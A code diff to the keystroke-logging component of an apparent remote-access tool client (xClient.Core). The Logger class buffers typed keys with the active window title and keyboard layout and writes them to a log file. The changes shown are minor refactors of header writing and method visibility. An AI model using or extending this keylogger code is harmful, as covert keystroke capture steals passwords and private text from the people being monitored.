@@ -73,9 +73,7 @@ namespace xClient.Core
 
         public Logger(double flushInterval)
         {
-            hWndTitle = GetActiveWindowTitle();
-
-            hWndLastTitle = hWndTitle;
+            hWndLastTitle = "";
 
             WriteFile();
 
@@ -223,7 +221,14 @@ namespace xClient.Core
                         try
                         {
                             if (writeHeader)
-                                sw.Write("Log created on " + DateTime.Now.ToString("MM-dd-yyyy") + "\n");
+                            {
+                                sw.Write("Log created on " + DateTime.Now.ToString("MM-dd-yyyy") + "\n\n\n");
+
+                                if (keyBuffer != "")
+                                    sw.Write(keyBuffer);
+
+                                hWndLastTitle = "";
+                            }
                             else
                                 sw.Write(keyBuffer);
                         }
@@ -238,7 +243,7 @@ namespace xClient.Core
             keyBuffer = "";
         }
 
-        public string GetActiveWindowTitle()
+        private string GetActiveWindowTitle()
         {
             IntPtr hwnd = GetForegroundWindow();
 
@@ -251,7 +256,7 @@ namespace xClient.Core
             return title != "" ? title : null;
         }
 
-        public IntPtr GetActiveKeyboardLayout()
+        private IntPtr GetActiveKeyboardLayout()
         {
             IntPtr hWnd = GetForegroundWindow();
 
@@ -260,7 +265,7 @@ namespace xClient.Core
             return GetKeyboardLayout(GetWindowThreadProcessId(hWnd, out pid));
         }
 
-        public char? FromKeys(int keys, bool shift)
+        private char? FromKeys(int keys, bool shift)
         {
             var keyStates = new byte[256];
 
